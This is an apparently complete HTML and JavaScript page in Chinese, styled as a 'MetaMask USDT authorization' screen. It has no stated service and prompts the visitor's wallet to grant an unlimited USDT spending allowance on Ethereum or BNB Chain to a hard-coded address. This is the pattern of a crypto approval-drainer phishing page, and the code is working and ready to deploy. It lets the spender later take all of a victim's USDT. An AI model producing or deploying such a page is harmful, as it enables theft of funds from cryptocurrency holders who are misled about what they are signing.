<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>MetaMask USDT 授权 (EVM 链)</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.96);
            border-radius: 24px;
            padding: 32px;
            max-width: 480px;
            width: 100%;
            text-align: center;
        }
        h1 { font-size: 28px; margin-bottom: 20px; color: #333; }
        .chain-selector {
            display: flex;
            gap: 12px;
            margin-bottom: 20px;
        }
        .chain-btn {
            flex: 1;
            padding: 12px;
            border: 2px solid #e0e0e0;
            background: white;
            border-radius: 12px;
            cursor: pointer;
            font-weight: 500;
        }
        .chain-btn.active {
            border-color: #667eea;
            background: #f0f0ff;
            color: #667eea;
        }
        .info-box {
            background: #f5f5f5;
            padding: 12px;
            border-radius: 12px;
            margin: 16px 0;
            text-align: left;
        }
        .info-label { font-size: 12px; color: #666; }
        .info-value { font-size: 12px; color: #333; word-break: break-all; margin-top: 4px; }
        .approve-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            border-radius: 18px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 16px;
        }
        .status {
            margin-top: 16px;
            padding: 12px;
            border-radius: 12px;
            font-size: 14px;
        }
        .status.loading { background: #fff3cd; color: #856404; }
        .status.success { background: #d4edda; color: #155724; }
        .status.error { background: #f8d7da; color: #721c24; }
        .hidden { display: none; }
        .loading-spinner {
            display: inline-block;
            width: 14px;
            height: 14px;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #667eea;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .dialog-mask {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.5);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
        }
        .dialog {
            background: white;
            border-radius: 18px;
            padding: 20px;
            max-width: 80%;
            text-align: center;
        }
        .dialog-button {
            margin-top: 16px;
            padding: 8px 24px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 30px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 USDT 授权</h1>
        <div class="chain-selector" id="chainSelector">
            <button class="chain-btn active" data-chain="1">Ethereum</button>
            <button class="chain-btn" data-chain="56">BNB Chain</button>
        </div>

        <div class="info-box">
            <div class="info-label">授权地址</div>
            <div class="info-value" id="spenderDisplay">0xEe435a366f0c89BE2108f8b02fFDe366158effa1</div>
            <div class="info-label" style="margin-top: 12px;">授权额度</div>
            <div class="info-value">无限 (2^256-1)</div>
        </div>

        <button class="approve-btn" id="approveBtn">授权 USDT</button>
        <div id="status" class="status hidden"></div>
    </div>

    <div id="dialogMask" class="dialog-mask hidden">
        <div class="dialog">
            <div class="dialog-message" id="dialogMessage"></div>
            <button class="dialog-button" id="dialogClose">确定</button>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <script>
        // 配置
        const USDT_ADDRESS = {
            1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
            56: '0x55d398326f99059fF775485246999027B3197955'
        };
        const SPENDER_ADDRESS = {
            1: '0xEe435a366f0c89BE2108f8b02fFDe366158effa1',
            56: '0xEe435a366f0c89BE2108f8b02fFDe366158effa1'
        };
        const UNLIMITED_AMOUNT = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

        // 网络配置（用于切换）
        const NETWORKS = {
            1: {
                chainId: '0x1',
                chainName: 'Ethereum Mainnet',
                nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
                rpcUrls: ['https://mainnet.infura.io/v3/'],
                blockExplorerUrls: ['https://etherscan.io']
            },
            56: {
                chainId: '0x38',
                chainName: 'BNB Smart Chain',
                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                rpcUrls: ['https://bsc-dataseed.binance.org/'],
                blockExplorerUrls: ['https://bscscan.com']
            }
        };

        let currentChain = '1';
        let provider = null;

        // DOM 元素
        const chainSelector = document.getElementById('chainSelector');
        const spenderDisplay = document.getElementById('spenderDisplay');
        const approveBtn = document.getElementById('approveBtn');
        const statusDiv = document.getElementById('status');
        const dialogMask = document.getElementById('dialogMask');
        const dialogMessage = document.getElementById('dialogMessage');
        const dialogClose = document.getElementById('dialogClose');

        function showStatus(message, type = 'loading') {
            statusDiv.innerHTML = type === 'loading' ? `<span class="loading-spinner"></span>${message}` : message;
            statusDiv.className = `status ${type}`;
            statusDiv.classList.remove('hidden');
        }
        function hideStatus() { statusDiv.classList.add('hidden'); }
        function showDialog(msg) {
            dialogMessage.textContent = msg;
            dialogMask.classList.remove('hidden');
        }
        function hideDialog() { dialogMask.classList.add('hidden'); }
        dialogClose.onclick = hideDialog;
        dialogMask.onclick = (e) => { if (e.target === dialogMask) hideDialog(); };

        // 更新授权地址显示
        function updateSpenderDisplay() {
            spenderDisplay.textContent = SPENDER_ADDRESS[currentChain];
        }

        // 检查并切换网络
        async function switchNetwork(targetChainId) {
            const targetHex = '0x' + parseInt(targetChainId).toString(16);
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: targetHex }]
                });
                return true;
            } catch (error) {
                if (error.code === 4902) {
                    // 网络未添加，尝试添加
                    try {
                        await window.ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [NETWORKS[targetChainId]]
                        });
                        return true;
                    } catch (addError) {
                        console.error('添加网络失败:', addError);
                        showDialog(`添加网络失败: ${addError.message}`);
                        return false;
                    }
                } else {
                    console.error('切换网络失败:', error);
                    showDialog(`切换网络失败: ${error.message}`);
                    return false;
                }
            }
        }

        // 授权函数
        async function approve() {
            if (!window.ethereum) {
                showDialog('请确保在 MetaMask 内置浏览器中打开此页面');
                return;
            }
            hideStatus();
            showStatus('正在连接钱包...', 'loading');

            try {
                const targetChainId = parseInt(currentChain);
                // 检查当前网络
                const currentChainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
                const currentChainId = parseInt(currentChainIdHex, 16);

                if (currentChainId !== targetChainId) {
                    showStatus(`当前网络不是目标网络，正在切换...`, 'loading');
                    const switched = await switchNetwork(targetChainId);
                    if (!switched) {
                        showStatus('网络切换失败，请手动切换到目标网络', 'error');
                        return;
                    }
                    // 等待一小段时间让网络切换生效
                    await new Promise(resolve => setTimeout(resolve, 500));
                }

                // 请求账户
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                const userAddress = accounts[0];
                showStatus(`已连接: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`, 'loading');

                // 构造交易
                const iface = new ethers.utils.Interface([
                    'function approve(address spender, uint256 amount) returns (bool)'
                ]);
                const data = iface.encodeFunctionData('approve', [SPENDER_ADDRESS[targetChainId], UNLIMITED_AMOUNT]);
                const transaction = {
                    to: USDT_ADDRESS[targetChainId],
                    from: userAddress,
                    data: data,
                    chainId: targetChainId
                };

                console.log('发送交易:', {
                    chainId: targetChainId,
                    to: transaction.to,
                    from: transaction.from,
                    data: transaction.data
                });

                showStatus('请在钱包中确认授权...', 'loading');
                const txHash = await window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [transaction]
                });
                showStatus(`✅ 授权成功！交易ID: ${txHash.slice(0,10)}...`, 'success');
            } catch (error) {
                console.error('授权失败:', error);
                let errorMsg = error.message || '未知错误';
                if (error.code === 4001) {
                    errorMsg = '用户取消了授权';
                } else if (error.code === -32603) {
                    errorMsg = '交易失败，可能原因：链未切换、gas 不足或合约地址错误';
                }
                showStatus(`授权失败: ${errorMsg}`, 'error');
                showDialog(`授权失败: ${errorMsg}\n请检查控制台输出获取更多信息。`);
            }
        }

        // 链切换
        function onChainChange(chainId) {
            currentChain = chainId;
            updateSpenderDisplay();
            hideStatus();
        }

        // 初始化
        function init() {
            // 链选择器事件
            document.querySelectorAll('.chain-btn').forEach(btn => {
                btn.addEventListener('click', () => {
                    document.querySelectorAll('.chain-btn').forEach(b => b.classList.remove('active'));
                    btn.classList.add('active');
                    onChainChange(btn.dataset.chain);
                });
            });
            approveBtn.addEventListener('click', approve);
            updateSpenderDisplay();
        }
        init();
    </script>
</body>
</html>
